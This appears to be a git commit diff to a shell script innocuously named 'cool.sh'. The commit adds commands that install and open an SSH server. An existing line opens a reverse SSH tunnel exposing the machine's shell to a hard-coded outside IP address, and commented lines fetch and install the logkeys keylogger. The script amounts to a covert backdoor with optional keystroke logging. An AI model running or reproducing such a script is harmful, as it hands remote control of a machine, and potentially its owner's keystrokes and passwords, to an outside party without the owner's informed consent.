ab1173776f2bd3ad267d0c41b132d4dc3c2b266f
gizmo87898 <73662348+gizmo87898@users.noreply.github.com>
2022-04-25 08:49:56 -0400

    Update cool.sh

--- cool.sh
+++ cool.sh
@@ -1,3 +1,6 @@
+sudo apt update
+sudo apt install openssh-server -y
+sudo ufw allow ssh
 ssh -R 2222:localhost:22 gizmo@75.138.184.49
 #wget http://launchpadlibrarian.net/165012984/logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
 #sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
